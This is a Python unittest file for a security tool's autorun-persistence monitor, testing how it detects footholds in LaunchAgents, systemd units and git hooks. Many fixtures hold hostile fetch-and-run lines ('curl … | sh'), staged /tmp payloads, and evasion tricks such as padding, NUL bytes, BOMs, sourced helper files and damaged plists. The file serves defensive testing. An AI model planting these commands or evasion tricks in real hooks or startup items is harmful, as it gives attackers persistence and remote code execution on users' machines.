#!/usr/bin/env python3
"""Autorun-surface monitor (#1333): catch a NOVEL foothold in a KNOWN location by fusing novelty +
provenance + content-shape + correlation — no signature required. Also locks the load-bearing safety
property: the baseline is NEVER trusted for safety (a tampered/absent baseline can't launder a
foothold), grading is deterministic at any -j, and non-regular files are never opened."""
from __future__ import annotations

import json
import os
import plistlib
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security import hookscript
from stayawake.bots.security.hygiene import mechanism, models
from stayawake.bots.security.hygiene.autorun import surface, provenance, grade, baseline, check_autorun

_ATTR = "stayawake.bots.security.hygiene.autorun.provenance"


def _agent(**plist) -> bytes:
    return plistlib.dumps(plist)


class _Surface(unittest.TestCase):
    def setUp(self):
        # Under HOME, because that is where real persistence dirs live (`~/Library/LaunchAgents`,
        # `~/.config/systemd/user`). The default tempdir is `/tmp` on Linux and `/var/folders/…` on
        # macOS, so a fixture placed there is a world-writable scratch path on one platform and not
        # the other — which silently made every payload-location assertion below mean two different
        # things depending on where the suite ran. Asserted, not assumed, so it fails loudly rather
        # than inverting again.
        home = Path(tempfile.mkdtemp(prefix="autorun-", dir=Path.home()))
        self.assertFalse(mechanism._under_scratch(home),
                         "fixture must not sit in a scratch dir — see the note above")
        self.d = home / "entries"
        self.d.mkdir()
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        self.state = home / "state"
        self.state.mkdir()
        # isolate the baseline file + force a non-CI (workstation) env so novelty is exercised
        self.env = mock.patch.dict(os.environ, {
            "SAW_AUTORUN_BASELINE": str(self.state / "baseline.json"), "CI": ""})
        self.env.start()
        self.addCleanup(self.env.stop)
        self.dirs = mock.patch(
            "stayawake.bots.security.hygiene.os_service.user_persistence_dirs", return_value=[self.d])
        self.dirs.start()
        self.addCleanup(self.dirs.stop)
        no_hooks = mock.patch("stayawake.bots.security.hygiene.autorun.surface.git_hook_dirs",
                              return_value=[])
        no_hooks.start()
        self.addCleanup(no_hooks.stop)

    def write(self, name: str, **plist):
        (self.d / name).write_bytes(_agent(**plist))

    def ids(self, issues):
        return {i.id for i in issues}


class TestSurfaceParse(_Surface):
    def test_parses_launch_agent_exec_and_persistence(self):
        self.write("x.plist", ProgramArguments=["/tmp/p", "-q"], RunAtLoad=True, StartInterval=60)
        (e,) = surface.enumerate_entries()[0]
        self.assertEqual(e.exec_path, "/tmp/p")
        self.assertIn("run-at-load", e.persistence)
        self.assertIn("poll-interval=60s", e.persistence)

    def test_a_damaged_launch_agent_is_still_read_for_what_it_runs(self):
        good = _agent(ProgramArguments=["/tmp/.x/evil", "-q"], RunAtLoad=True, StartInterval=60).decode()
        code = _agent(ProgramArguments=["/bin/sh", "-c", "cd /tmp/.x; /tmp/.x/run"], RunAtLoad=True,
                      StartInterval=60).decode()
        for name, raw in {
            "truncated": good.rsplit("</plist>", 1)[0].encode(),
            "unclosed dict": good.replace("</dict>", "", 1).encode(),
            "leading junk": b"junk\x01 " + good.encode(),
            "leading newline": b"\n" + good.encode(),
            "utf-16 with trailing text": code.encode("utf-16") + "\ngarbage\n".encode("utf-16-le"),
            "utf-32 with trailing text": code.encode("utf-32") + "\ngarbage\n".encode("utf-32-le"),
            "utf-16 mark on utf-8 text": b"\xff\xfe" + code.encode() + b"x",
            "declaration": good.replace('version="1.0"', 'version="1.0" x', 1).encode(),
            "trailing text": good.encode() + b"\n<<<<<<< HEAD\n",
            "control char": good.replace("-q", "-\x01q").encode(),
            "comment before the array": good.replace("<array>", "<!-- argv --><array>", 1).encode() + b"x",
            "comment inside the array": good.replace("</string>", "</string><!-- k -->", 1).encode() + b"x",
            "wide whitespace": good.replace("<array>", "\n" + " " * 70 + "<array>", 1).encode() + b"x",
            "string attribute": code.replace("<string>cd", '<string xml:space="preserve">cd').encode() + b"x",
            "cdata": code.replace("<string>cd /tmp/.x; /tmp/.x/run</string>",
                                  "<string><![CDATA[cd /tmp/.x; /tmp/.x/run]]></string>").encode() + b"x",
            "long argument": code.replace("cd /tmp/.x;", "cd /tmp/.x; " + "true; " * 800).encode() + b"x",
            "many arguments": code.replace("<string>-c</string>",
                                           "<string>-x</string>" * 70 + "<string>-c</string>").encode() + b"x",
            "decoy after the root": code.encode() + b"<dict><key>ProgramArguments</key><array>"
                                                    b"<string>/usr/bin/true</string></array></dict>",
            "decoy in a second plist": code.encode() + b'<plist version="1.0"><dict><key>ProgramArguments'
                                                       b"</key><array><string>/usr/bin/true</string></array>"
                                                       b"</dict></plist>",
        }.items():
            (self.d / "x.plist").write_bytes(raw)
            (e,) = surface.enumerate_entries()[0]
            self.assertIn(e.argv[0], ("/tmp/.x/evil", "/bin/sh"), name)
            self.assertIn("/tmp/.x/", " ".join(e.argv), name)
            self.assertEqual(len(e.argv), 2 if e.argv[0] == "/tmp/.x/evil" else len(e.argv), name)
            self.assertEqual(e.shell_lines, [" ".join(e.argv)], name)
            self.assertIn("run-at-load", e.persistence, name)
            self.assertIn("poll-interval=60s", e.persistence, name)
            self.assertTrue(grade.content_signal(e).hit, name)

    def test_a_damaged_launch_agent_reads_its_triggers_as_an_intact_one_does(self):
        for name, plist in {
            "empty keep-alive": dict(ProgramArguments=["/tmp/p"], KeepAlive={}),
            "keep-alive on exit": dict(ProgramArguments=["/tmp/p"], KeepAlive={"SuccessfulExit": False}),
            "fractional interval": dict(ProgramArguments=["/tmp/p"], StartInterval=3600.0),
            "whole interval": dict(ProgramArguments=["/tmp/p"], StartInterval=60),
            "run at load off": dict(ProgramArguments=["/tmp/p"], RunAtLoad=False),
            "empty watch list": dict(ProgramArguments=["/tmp/p"], WatchPaths=[]),
            "calendar": dict(ProgramArguments=["/tmp/p"], StartCalendarInterval={"Hour": 3}),
        }.items():
            (self.d / "i.plist").write_bytes(_agent(**plist))
            (intact,) = surface.enumerate_entries()[0]
            (self.d / "i.plist").write_bytes(b"\n" + _agent(**plist))
            (damaged,) = surface.enumerate_entries()[0]
            self.assertEqual(damaged.argv, intact.argv, name)
            self.assertEqual(damaged.persistence, intact.persistence, name)

    def test_a_damaged_launch_agent_too_large_to_read_is_treated_as_before(self):
        big = _agent(ProgramArguments=["/bin/sh", "-c", "cd /tmp/.x; /tmp/.x/run"], Blob="A" * (1 << 20))
        (self.d / "big.plist").write_bytes(b"\n" + big)
        (e,) = surface.enumerate_entries()[0]
        self.assertEqual(e.argv, [])
        self.assertEqual(e.shell_lines, [e.body])
        self.assertTrue(grade.content_signal(e).hit)

    def test_a_damaged_launch_agent_reads_a_program_as_written(self):
        good = _agent(Program="/tmp/.x/a&b", KeepAlive=True).decode()
        (self.d / "p.plist").write_bytes(good.rsplit("</plist>", 1)[0].encode())
        (e,) = surface.enumerate_entries()[0]
        self.assertEqual(e.argv, ["/tmp/.x/a&b"])
        self.assertIn("keep-alive", e.persistence)

    def test_a_damaged_launch_agent_is_judged_by_what_it_runs_not_by_its_text(self):
        for name, plist in {
            "pipe": dict(ProgramArguments=["/usr/bin/myd"], Comment="log | /tmp/app.sock"),
            "backtick": dict(ProgramArguments=["/usr/bin/myd"], StandardOutPath="`/tmp/myd.log"),
        }.items():
            raw = _agent(**plist).decode().rsplit("</plist>", 1)[0].encode()
            (self.d / "b.plist").write_bytes(raw)
            (e,) = surface.enumerate_entries()[0]
            self.assertNotIn(e.body, e.shell_lines, name)
            self.assertFalse(grade.content_signal(e).hit, name)

    def test_a_launch_agent_that_cannot_be_read_whole_names_no_command_and_is_still_scanned(self):
        code = _agent(ProgramArguments=["/bin/sh", "-c", "cd /tmp/.x; /tmp/.x/run"], RunAtLoad=True).decode()
        for name, raw in {
            "unescaped <": code.replace("/tmp/.x/run<", "/tmp/.x/run </dev/null<").encode() + b"x",
            "array cut short": code.split("</array>", 1)[0].encode(),
            "nested value": code.replace("<string>-c</string>", "<dict></dict>", 1).encode() + b"x",
            "key in the array": code.replace("<string>cd /tmp/.x; /tmp/.x/run</string>",
                                             "<key>cd /tmp/.x; /tmp/.x/run</key>").encode() + b"x",
            "comment in a value": code.replace("cd /tmp/.x;", "cd /tmp/.x <!-- k -->;").encode() + b"x",
            "second array cut short": code.rsplit("</dict>", 1)[0].encode()
                                      + b"<key>ProgramArguments</key><array><string>/usr/bin/true</string>",
            "arguments as one string": code.replace("<key>ProgramArguments</key>",
                                                    "<key>ProgramArguments</key><string>x</string>", 1)
                                           .encode() + b"x",
            "entity": code.replace("<plist", '<!DOCTYPE plist [<!ENTITY p "/tmp/.x/run">]><plist', 1)
                          .replace("/tmp/.x/run</string>", "&p;</string>").encode() + b"x",
            "openstep": b'{ Label = "a"; ProgramArguments = ( "/bin/sh", "-c", "cd /tmp/.x; /tmp/.x/run" ); }',
            "no command": _agent(Label="x", Comment="a || /tmp/x").decode().rsplit("</plist>", 1)[0].encode(),
        }.items():
            (self.d / "u.plist").write_bytes(raw)
            (e,) = surface.enumerate_entries()[0]
            self.assertEqual(e.argv, [], name)
            self.assertEqual(e.shell_lines, [e.body], name)
            if name != "entity":
                self.assertTrue(grade.content_signal(e).hit, name)

    def test_an_intact_launch_agent_naming_no_command_is_judged_the_same_way(self):
        for name, plist in {
            "pipe": dict(Label="x", Comment="log | /tmp/app.sock"),
            "backtick": dict(Label="x", StandardOutPath="`/tmp/myd.log"),
        }.items():
            (self.d / "c.plist").write_bytes(_agent(**plist))
            (e,) = surface.enumerate_entries()[0]
            self.assertNotIn(e.body, e.shell_lines, name)
            self.assertFalse(grade.content_signal(e).hit, name)

    def test_parses_systemd_execstart(self):
        (self.d / "w.service").write_text("[Service]\nExecStart=-/usr/bin/foo --bar\n[Install]\nWantedBy=default.target\n")
        (e,) = surface.enumerate_entries()[0]
        self.assertEqual(e.exec_path, "/usr/bin/foo")     # leading `-` modifier stripped
        self.assertIn("enabled", e.persistence)

    def test_non_regular_file_is_never_opened(self):
        if not hasattr(os, "mkfifo"):
            self.skipTest("no mkfifo")
        fifo = self.d / "evil.plist"
        os.mkfifo(fifo)                  # a FIFO named like a plist would hang open()
        entries, unread = surface.enumerate_entries()
        self.assertEqual(entries, [])
        self.assertEqual(unread, [fifo])

    @unittest.skipIf(os.getuid() == 0, "root bypasses permission bits")
    def test_unlistable_dir_is_not_clean(self):
        os.chmod(self.d, 0o000)
        try:
            issues = check_autorun()
        finally:
            os.chmod(self.d, 0o700)
        self.assertEqual([i.id for i in issues], ["persistence-surface-unverified"])
        self.assertEqual(issues[0].severity, "unknown")


class TestGitHooks(_Surface):
    """The hooks directories git runs through saw's template are autorun entries."""

    def setUp(self):
        super().setUp()
        self.hooks = self.d.parent / "hooks"
        self.hooks.mkdir()
        patcher = mock.patch("stayawake.bots.security.hygiene.autorun.surface.git_hook_dirs",
                             return_value=[self.hooks])
        patcher.start()
        self.addCleanup(patcher.stop)
        exec_bit = mock.patch("stayawake.bots.security.hookscript.honours_exec_bit", return_value=True)
        exec_bit.start()
        self.addCleanup(exec_bit.stop)

    def _hook(self, name: str, text: str, executable: bool = True) -> Path:
        p = self.hooks / name
        p.write_text(text, encoding="utf-8")
        os.chmod(p, 0o755 if executable else 0o644)
        return p

    def _run(self, **patches):
        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
            return check_autorun()

    def test_an_executable_hook_is_an_entry_and_a_plain_file_is_not(self):
        self._hook("post-merge", "#!/bin/sh\nnpx lint-staged\n")
        self._hook("pre-push", "#!/bin/sh\ncurl -s http://x | sh\n", executable=False)
        (entries, unread) = surface.enumerate_entries()
        self.assertEqual([e.path.name for e in entries], ["post-merge"])
        self.assertEqual(entries[0].argv, [str(self.hooks / "post-merge")])
        self.assertIn("git-event:post-merge", entries[0].persistence)
        self.assertEqual(unread, [])

    def test_a_hook_saw_installed_runs_the_saw_it_names(self):
        self._hook("post-merge", hookscript.render("post-merge", "/opt/my saw$dir/saw", "/home/op/c f.yml"))
        (e,) = surface.enumerate_entries()[0]
        self.assertEqual(e.argv, ["/opt/my saw$dir/saw", "hook", "run", "--config", "/home/op/c f.yml",
                                  "post-merge"])

    def test_the_hooks_saw_installs_are_quiet(self):
        for event in hookscript.HOOKS:
            self._hook(event, hookscript.render(event, "/opt/my saw$dir/saw", "/home/op/c f.yml"))
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])

    def test_installing_the_hooks_after_an_audit_is_not_news(self):
        self.write("ok.plist", ProgramArguments=["/usr/bin/true"], RunAtLoad=True)
        self.assertEqual(self._run(signed=True), [])
        for event in hookscript.HOOKS:
            self._hook(event, hookscript.render(event, "/home/op/.local/bin/saw", None))
        self.assertEqual(self._run(signed=None), [])

    def test_a_hook_saw_installed_that_was_changed_is_a_foothold(self):
        for name, text in {
            "payload": hookscript.render("post-checkout", "/usr/local/bin/saw", None)
                       .replace("exit 0\n", "curl -s http://x/p | sh\nexit 0\n"),
            "quiet edit": hookscript.render("post-merge", "/usr/local/bin/saw", None)
                          .replace("exit 0\n", "echo done\nexit 0\n"),
            "call redirected": hookscript.render("post-rewrite", "/usr/local/bin/saw", None)
                               .replace("/usr/local/bin/saw", "/tmp/.x/saw"),
        }.items():
            (self.hooks / "post-checkout").unlink(missing_ok=True)
            self._hook("post-checkout", text)
            issues = self._run()
            self.assertIn("autorun-unattributed-foothold", self.ids(issues), name)
            told = "scratch" if name == "call redirected" else "has been modified"
            self.assertTrue(any(told in i.detail for i in issues), name)

    def test_a_hook_saw_installed_from_a_tool_cache_is_still_saw(self):
        for saw in ("/home/op/.cache/uv/archive-v0/XkQ2mZ9pL1/bin/saw",
                    "/home/op/.local/pipx/.cache/8f3b2a1c9d0e4f56/bin/saw",
                    "/home/op/.cache/pypoetry/virtualenvs/proj-Ab3dEf-py3.12/bin/saw"):
            for event in hookscript.HOOKS:
                (self.hooks / event).unlink(missing_ok=True)
                self._hook(event, hookscript.render(event, saw, None))
            self.assertEqual(self._run(signed=None), [], saw)

    def test_only_what_git_runs_is_an_entry(self):
        self._hook("pre-commit.sample", "#!/bin/sh\ncurl -s http://x | sh\n")
        self._hook("lib.sh", "#!/bin/sh\ncurl -s http://x | sh\n")
        self._hook("post-merge.local", "#!/bin/sh\nnpx lint-staged\n")
        self._hook("pre-push", "#!/bin/sh\nnpm test\n")
        names = sorted(e.path.name for e in surface.enumerate_entries()[0])
        self.assertEqual(names, ["post-merge.local", "pre-push"])

    def test_a_hook_that_uses_a_scratch_file_as_data_is_not_a_foothold(self):
        self._hook("pre-commit", "#!/bin/sh\nTMP=$(mktemp /tmp/hook.XXXXXX)\nnpx lint-staged > \"$TMP\"\n"
                                 "cat <<EOF\nlint-staged failed. Full output:\n/tmp/lint-staged.log\nEOF\n")
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])

    def test_a_foreign_hook_that_fetches_and_runs_is_a_foothold(self):
        self._hook("post-checkout", "#!/bin/sh\ncurl -s http://x/p | sh\n")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_a_hook_that_sources_a_sibling_is_read_with_it(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        self._hook("lib.sh", "#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n", executable=False)
        issues = self._run()
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))
        (e,) = [e for e in surface.enumerate_entries()[0] if e.path.name == "post-checkout"]
        before = e.digest()
        self._hook("lib.sh", "#!/bin/sh\ncurl -s http://127.0.0.1:9/q | sh\n", executable=False)
        (e,) = [e for e in surface.enumerate_entries()[0] if e.path.name == "post-checkout"]
        self.assertNotEqual(e.digest(), before)

    def test_every_support_file_in_a_hooks_directory_is_read_however_it_is_reached(self):
        payload = "#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n"
        for name, (hook, files) in {
            "brace expansion": ('. "${0%/*}/lib.sh"\n', {"lib.sh": payload}),
            "dirname --": ('. "$(dirname -- "$0")/lib.sh"\n', {"lib.sh": payload}),
            "cd and pwd": ('. "$(cd "$(dirname "$0")" && pwd)/lib.sh"\n', {"lib.sh": payload}),
            "subdirectory": ('. "$(dirname "$0")/lib/x.sh"\n', {"lib/x.sh": payload}),
            "chain": ('. "$(dirname "$0")/lib.sh"\n',
                      {"lib.sh": '. "$(dirname "$0")/lib2.sh"\n', "lib2.sh": payload}),
            "padded": ('. "$(dirname "$0")/lib.sh"\n', {"lib.sh": "# pad\n" * 12_000 + payload}),
            "named like a hook": ('. "$(dirname "$0")/pre-commit"\n', {"pre-commit": payload}),
            "sample": ('. "$(dirname "$0")/post-checkout.sample"\n', {"post-checkout.sample": payload}),
            "deep": ('. "$(dirname "$0")/a/b/c/d/lib.sh"\n', {"a/b/c/d/lib.sh": payload}),
        }.items():
            for old in list(self.hooks.rglob("*")):
                if old.is_file():
                    old.unlink()
            self._hook("post-checkout", "#!/bin/sh\n" + hook + "exit 0\n")
            for rel, text in files.items():
                p = self.hooks / rel
                p.parent.mkdir(parents=True, exist_ok=True)
                p.write_text(text, encoding="utf-8")
            self.assertIn("autorun-unattributed-foothold", self.ids(self._run()), name)

    def test_the_hooks_saw_installs_stay_quiet_beside_other_files(self):
        for event in hookscript.HOOKS:
            self._hook(event, hookscript.render(event, "/home/op/.local/bin/saw", None))
        (self.hooks / "husky.sh").write_text("#!/bin/sh\n# husky\nhookName=$(basename \"$0\")\n", encoding="utf-8")
        (self.hooks / ".DS_Store").write_bytes(b"\x00\x00\x00\x01Bud1")
        (self.hooks / "README.md").write_text("# hooks\n\nInstall: `curl -sSfL https://x/i.sh | sh`\n", encoding="utf-8")
        (self.hooks / "pre-commit.legacy").write_text("#!/bin/sh\nexec npx lint-staged\n", encoding="utf-8")
        self.assertEqual(self._run(signed=None), [])
        self.assertEqual(self._run(signed=None), [])

    def test_prose_beside_a_hook_is_not_code(self):
        self._hook("pre-commit", "#!/bin/sh\nnpx lint-staged\n")
        (self.hooks / "README.md").write_text(
            "Install gitleaks:\n\n    curl -sSfL https://raw.githubusercontent.com/x/install.sh | sh\n", encoding="utf-8")
        self.assertEqual(self._run(), [])
        (e,) = surface.enumerate_entries()[0]
        before = e.digest()
        (self.hooks / "README.md").write_text("Changed.\n", encoding="utf-8")
        (e,) = surface.enumerate_entries()[0]
        self.assertNotEqual(e.digest(), before)

    def test_a_hook_that_makes_a_scratch_file_after_another_command_is_not_a_foothold(self):
        self._hook("pre-commit", '#!/bin/sh\ncd "$(git rev-parse --show-toplevel)" || exit 1; '
                                 'TMP=$(mktemp /tmp/pre-commit.XXXXXX)\nnpx lint-staged > "$TMP"\n')
        self.assertEqual(self._run(), [])

    def test_a_binary_beside_a_hook_is_neither_read_as_code_nor_a_gap(self):
        self._hook("pre-commit", '#!/bin/sh\n"$(dirname "$0")/bin/gitleaks" git --pre-commit\n')
        (self.hooks / "bin").mkdir()
        (self.hooks / "bin" / "gitleaks").write_bytes(b"\x7fELF" + b"\x00" * 64 + bytes(range(256)) * 8192)
        entries, unread = surface.enumerate_entries()
        self.assertEqual([e.path.name for e in entries], ["pre-commit"])
        self.assertEqual(unread, [])
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])

    def test_what_a_shell_runs_before_a_nul_byte_is_code_and_the_rest_is_still_baselined(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        (self.hooks / "lib.sh").write_bytes(b"echo ok\ncurl -s http://127.0.0.1:9/p | sh\n#" + b"\x00" * 8 + b"\n")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        (self.hooks / "lib.sh").write_bytes(b"\x00" * 8 + b"\necho later\n")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
        self.assertEqual(self._run(), [])
        (self.hooks / "lib.sh").write_bytes(b"\x00" * 8 + b"\ncurl -s http://127.0.0.1:9/p | sh\n")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
        self.assertEqual(self._run(), [])
        big = b"#\x00 harmless\n" + b"# pad\n" * (hookscript.MAX_SUPPORT_FILE // 6 + 1)
        (self.hooks / "lib.sh").write_bytes(big + b"echo later\n")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
        self.assertEqual(self._run(), [])
        (self.hooks / "lib.sh").write_bytes(big + b"curl -s http://127.0.0.1:9/p | sh\n")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})

    def test_a_symlinked_support_file_is_read_or_the_directory_is_unverified(self):
        outside = self.d.parent / "elsewhere.sh"
        outside.write_text("#!/bin/sh\ncurl -s http://127.0.0.1:9/p | sh\n", encoding="utf-8")
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        os.symlink(outside, self.hooks / "lib.sh")
        issues = check_autorun()
        self.assertTrue(self.ids(issues) & {"autorun-unattributed-foothold", "persistence-surface-unverified"},
                        issues)

    def test_too_many_support_files_withhold_the_all_clear(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        junk = self.hooks / "junk"
        junk.mkdir()
        for i in range(hookscript.MAX_SUPPORT_FILES + 1):
            (junk / f"f{i}").write_text("# pad\n", encoding="utf-8")
        entries, unread = surface.enumerate_entries()
        self.assertEqual([e.path.name for e in entries], ["post-checkout"])
        self.assertEqual(unread, [self.hooks])

    def test_a_support_file_too_large_to_read_withholds_the_all_clear(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        (self.hooks / "lib.sh").write_bytes(b"# pad\n" * (hookscript.MAX_SUPPORT_FILE // 6 + 1))
        entries, unread = surface.enumerate_entries()
        self.assertEqual([e.path.name for e in entries], ["post-checkout"])
        self.assertEqual(unread, [self.hooks / "lib.sh"])
        self.assertIn("persistence-surface-unverified", self.ids(check_autorun()))

    def test_shell_longer_than_saw_reads_as_shell_is_still_seen_and_still_withholds_the_all_clear(self):
        from stayawake.bots.security.hygiene.autorun.grade import MAX_SHELL_SCRIPT
        payload = "curl -s http://127.0.0.1:9/p | sh\n"
        self._hook("post-checkout", "#!/bin/sh\n" + "# pad\n" * (MAX_SHELL_SCRIPT // 6 + 1) + payload)
        self._hook("post-merge", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        (self.hooks / "lib.sh").write_text("# pad\n" * (MAX_SHELL_SCRIPT // 6 + 1) + payload, encoding="utf-8")
        entries, unread = surface.enumerate_entries()
        self.assertEqual([e.path.name for e in entries], ["post-checkout", "post-merge"])
        self.assertEqual(sorted(unread), sorted([self.hooks / "lib.sh", self.hooks / "post-checkout"]))
        issues = check_autorun()
        self.assertEqual(self.ids(issues) & {"autorun-unattributed-foothold", "persistence-surface-unverified"},
                         {"autorun-unattributed-foothold", "persistence-surface-unverified"}, issues)

    def test_each_shell_file_is_read_on_its_own(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib.sh"\nexit 0\n')
        (self.hooks / "aaa.sh").write_text("echo 'unterminated\n", encoding="utf-8")
        (self.hooks / "lib.sh").write_text("/tmp/.x/run\n", encoding="utf-8")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_a_program_beside_a_hook_is_read_as_text_and_not_as_shell(self):
        self._hook("pre-commit", '#!/bin/sh\nexec "$(dirname "$0")/node_modules/.bin/lint" "$@"\n')
        gen = self.hooks / "node_modules" / "gen" / "test" / "gen.js"
        gen.parent.mkdir(parents=True)
        gen.write_text("var file = process.argv[2] || '/tmp/JSONStream-test-large.json'\n"
                       "run() && '/tmp/out'\n", encoding="utf-8")
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])
        gen.write_text('require("child_process").exec("curl -s http://127.0.0.1:9/p | sh")\n',
                       encoding="utf-8")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_a_program_a_shell_runs_is_read_as_the_shell_it_is(self):
        for name, hook in {
            "sh": 'sh "$(dirname "$0")/lib.js"\n',
            "bash -e": 'bash -e "$(dirname "$0")/lib.js"\n',
            "source": '. "$(dirname "$0")/lib.js"\n',
            "direct": '"$(dirname "$0")/lib.js"\n',
            "via a helper": '. "$(dirname "$0")/helper.sh"\n',
        }.items():
            for old in list(self.hooks.rglob("*")):
                if old.is_file():
                    old.unlink()
            self._hook("post-checkout", "#!/bin/sh\n" + hook + "exit 0\n")
            if "helper" in name:
                (self.hooks / "helper.sh").write_text('sh "$(dirname "$0")/lib.js"\n', encoding="utf-8")
            (self.hooks / "lib.js").write_text("nohup /tmp/.x/stage &\n", encoding="utf-8")
            self.assertIn("autorun-unattributed-foothold", self.ids(self._run()), name)
        for old in list(self.hooks.rglob("*")):
            if old.is_file():
                old.unlink()
        self._hook("post-checkout", '#!/bin/sh\n"$(dirname "$0")/lib.js"\nexit 0\n')
        (self.hooks / "lib.js").write_text("#!/usr/bin/env node\nrun() || '/tmp/out'\n", encoding="utf-8")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
        self.assertEqual(self._run(), [])

    def test_a_hook_is_read_as_what_its_first_line_says_runs_it(self):
        self._hook("commit-msg", "#!/usr/bin/env node\n"
                                 "const logFile = process.env.HOOK_LOG || '/tmp/commit-msg.log';\n")
        self.assertEqual(self._run(), [])
        self._hook("commit-msg", "#!/usr/bin/env node\n"
                                 "const logFile = process.env.HOOK_LOG || '/tmp/commit-msg.txt';\n")
        self.assertEqual(self.ids(self._run()), {"autorun-new-unattributed"})
        self.assertEqual(self._run(), [])
        self._hook("commit-msg", "#!/usr/bin/env node\n"
                                 'require("child_process").exec("curl -s http://127.0.0.1:9/p | sh")\n')
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        self._hook("commit-msg", "nohup /tmp/.x/stage &\n")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        self._hook("commit-msg", "#!/usr/bin/env -S bash -e\nnohup /tmp/.x/stage &\n")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        self._hook("commit-msg", '#!/bin/ash\n. "/tmp/.x/stage"\n')
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        self._hook("commit-msg", '#!/opt/tools/ASH\n. "/tmp/.x/stage"\n')
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))
        self._hook("commit-msg", "#!/usr/bin/env node\nrequire('child_process').execSync('/tmp/.x/stage')\n")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_a_nested_directory_that_cannot_be_listed_withholds_the_all_clear(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/a/b/lib.sh"\nexit 0\n')
        hidden = self.hooks / "a" / "b"
        hidden.mkdir(parents=True)
        (hidden / "lib.sh").write_text("curl -s http://127.0.0.1:9/p | sh\n", encoding="utf-8")
        os.chmod(hidden, 0o100)
        self.addCleanup(os.chmod, hidden, 0o700)
        entries, unread = surface.enumerate_entries()
        self.assertEqual([e.path.name for e in entries], ["post-checkout"])
        self.assertEqual(unread, [hidden])
        self.assertIn("persistence-surface-unverified", self.ids(check_autorun()))

    def test_a_seeded_repository_that_vanished_from_git_is_reported_by_the_audit(self):
        repo = self.d.parent / "proj"

        def dirs(unread=None):
            if unread is not None:
                unread.append(repo)
            return [self.hooks]

        with mock.patch("stayawake.bots.security.hygiene.autorun.surface.git_hook_dirs", side_effect=dirs):
            self.assertEqual(surface.enumerate_entries()[1], [repo])
            self.assertIn("persistence-surface-unverified", self.ids(check_autorun()))

    def test_a_support_file_named_in_no_encoding_is_still_read(self):
        self._hook("post-checkout", '#!/bin/sh\nfor f in "$(dirname "$0")"/lib*.sh; do . "$f"; done\nexit 0\n')
        raw = os.fsencode(str(self.hooks)) + b"/lib\xff.sh"
        try:
            with open(raw, "wb") as fh:
                fh.write(b"curl -s http://127.0.0.1:9/p | sh\n")
        except OSError:
            self.skipTest("this filesystem refuses a name that is not text")
        entries, unread = surface.enumerate_entries()
        self.assertEqual(unread, [])
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_a_byte_order_mark_does_not_hide_what_runs_a_support_file(self):
        self._hook("post-checkout", '#!/bin/sh\n. "$(dirname "$0")/lib"\nexit 0\n')
        (self.hooks / "lib").write_text("﻿#!/bin/sh\n/tmp/.x/stage\n", encoding="utf-8")
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_a_hook_run_by_a_program_launcher_is_not_shell(self):
        self._hook("pre-commit", "#!/usr/bin/env -S uv run --script\n"
                                 'CACHE = {\n    "/tmp/ruff-cache": "ruff",\n}\n')
        self._hook("pre-push", "#!/usr/bin/env zx\nconst paths = {\n  '/tmp/zx-cache': true,\n}\n")
        self.assertEqual(self._run(), [])
        self.assertEqual(self._run(), [])

    def test_the_text_shared_by_every_hook_is_judged_once(self):
        for event in hookscript.HOOKS:
            self._hook(event, hookscript.render(event, "/home/op/.local/bin/saw", None))
        (self.hooks / "lib.sh").write_text("curl -s http://127.0.0.1:9/p | sh\n", encoding="utf-8")
        from stayawake.bots.security.hygiene.autorun import grade
        grade._shared_reasons.cache_clear()
        issues = self._run(signed=None)
        self.assertEqual(self.ids(issues), {"autorun-unattributed-foothold"})
        self.assertEqual(len(issues), len(hookscript.HOOKS), issues)
        self.assertEqual(grade._shared_reasons.cache_info().misses, 1)
        (self.hooks / "lib.sh").write_text("echo ok\n", encoding="utf-8")
        self.assertEqual(self._run(signed=None), [])

    def test_a_program_that_hands_a_scratch_path_to_a_shell_is_seen(self):
        self._hook("post-checkout", '#!/bin/sh\npython3 "$(dirname "$0")/lib.py"\nexit 0\n')
        (self.hooks / "lib.py").write_text('import os\nos.system("/tmp/.x/stage")\n', encoding="utf-8")
